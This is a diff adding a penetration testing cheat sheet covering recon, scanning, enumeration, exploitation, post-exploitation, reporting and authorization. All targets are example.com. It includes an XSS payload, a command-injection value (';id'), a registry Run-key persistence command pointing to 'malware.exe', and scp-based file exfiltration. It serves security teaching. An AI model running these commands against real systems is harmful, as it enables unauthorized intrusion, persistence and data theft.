@@ -1,0 +1,80 @@
+Penetration Testing Cheat Sheet
+1. Reconnaissance
+Passive Reconnaissance
+Google Dorks: site:example.com inurl:admin
+WHOIS Lookup: whois example.com
+DNS Enumeration: nslookup example.com
+Subdomain Enumeration: sublist3r -d example.com
+Social Media Recon: theharvester -d example.com -l 500 -b all
+Active Reconnaissance
+Port Scanning: nmap -sS -sV -T4 -p- example.com
+Service Enumeration: nmap -sC -sV example.com
+Vulnerability Scanning: openvas -t example.com
+2. Scanning
+Network Scanning
+nmap -sS -sU -T4 -A -v example.com
+nmap --top-ports 1000 example.com
+Web Application Scanning
+nikto -h example.com
+wpscan --url example.com
+3. Enumeration
+Service Enumeration
+FTP: ftp example.com
+SSH: ssh user@example.com
+SMB: smbclient //example.com/share
+Web Application Enumeration
+Directory Busting: dirb http://example.com
+Parameter Discovery: ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4. Exploitation
+Exploit Frameworks
+Metasploit: msfconsole
+Search for exploits: search example
+Use an exploit: use exploit/unix/webapp/example
+Set options: set RHOSTS example.com
+Exploit: exploit
+Manual Exploitation
+SQL Injection: sqlmap -u "http://example.com/vuln.php?id=1" --dbs
+Cross-Site Scripting (XSS): curl -X POST -d "input=<script>alert('XSS')</script>" http://example.com/vuln.php
+Command Injection: curl "http://example.com/vuln.php?cmd=;id"
+5. Post-Exploitation
+Privilege Escalation
+Linux: linpeas.sh
+Windows: winpeas.exe
+Persistence
+Crontab: crontab -e
+Windows Registry: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v name /t REG_SZ /d "C:\path\to\malware.exe"
+Data Exfiltration
+Exfiltrate files: scp user@example.com:/path/to/file /local/path
+Use steganography tools: steghide
+6. Reporting
+Tools
+Markdown: Use a structured format for your report.
+Screenshots: Capture evidence using tools like gnome-screenshot or flameshot.
+Videos: Record exploitation steps using screenkey or obs.
+Template
+Executive Summary
+Brief overview of the test.
+Key findings.
+Technical Findings
+Vulnerability description.
+Proof of concept.
+Impact.
+Recommendations.
+Appendices
+Screenshots.
+Logs.
+Tools used.
+7. Legal and Ethical Considerations
+Authorization
+Always obtain written authorization before testing.
+Scope
+Stick to the agreed scope.
+Compliance
+Follow industry standards (e.g., OWASP, NIST).
+8. Tools
+Reconnaissance: theharvester, sublist3r
+Scanning: nmap, openvas
+Enumeration: dirb, ffuf
+Exploitation: metasploit, sqlmap
+Post-Exploitation: linpeas, winpeas
+Reporting: markdown, gnome-screenshot, obs
